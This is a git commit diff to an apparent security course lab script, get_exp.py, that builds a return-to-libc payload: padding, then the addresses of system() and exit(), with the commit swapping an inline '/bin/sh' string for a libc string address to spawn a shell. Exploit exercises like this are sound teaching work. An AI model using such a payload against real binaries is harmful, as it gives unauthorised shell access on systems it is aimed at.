e43f0c097309791695bbddfa8f17843408b357d5
Suraj Rathi <suraj.rathi00@gmail.com>
2023-02-07 14:42:52 +0530

    working

--- a1/lab1_2/get_exp.py
+++ a1/lab1_2/get_exp.py
@@ -14,15 +14,11 @@ exp += 12 * 'B'
 # 0xf7e3f950: system
 exp += "\x50\xf9\xe3\xf7"
 
-# 0xffffcfd8: Address of the string
-exp +="\xf0\xcf\xff\xff"
-
 # 0xf7e337c0: address of exit function
 exp += "\xc0\x37\xe3\xf7"
 
-
-# String
-exp += "/bin/sh"
+# 0xf7f5e12b: Address of the string
+exp +="\x2b\xe1\xf5\xf7"
 
 print(exp)
 
